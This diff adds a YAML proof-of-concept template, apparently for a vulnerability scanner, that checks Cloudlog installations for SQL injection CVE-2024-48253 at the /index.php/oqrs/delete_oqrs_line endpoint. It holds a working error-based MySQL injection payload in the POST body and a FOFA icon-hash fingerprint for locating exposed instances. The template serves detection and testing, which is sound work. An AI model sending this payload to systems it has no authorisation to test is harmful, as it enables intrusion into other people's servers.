@@ -1,0 +1,22 @@
+id: poc-yaml-cloudlog-delete-oqrs-line-sqli
+info:
+  name: Cloudlog delete_oqrs_line SQL注入漏洞(CVE-2024-48253)
+  severity: high
+  tags:
+  - 两高一弱
+  - sql-injection
+  - CVE-2024-48253
+  finger: cloudlog
+  fofa: icon_hash="-460032467"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /index.php/oqrs/delete_oqrs_line
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: id=GTID_SUBSET(CONCAT((MID((IFNULL(CAST(MD5({{.t1}}) AS NCHAR),0x20)),1,190))),666)
+  expression: status_code == 500 && contains(body,"set specification") && contains(body,"Error
+    Number:") && contains(body,t2)
+transport: http
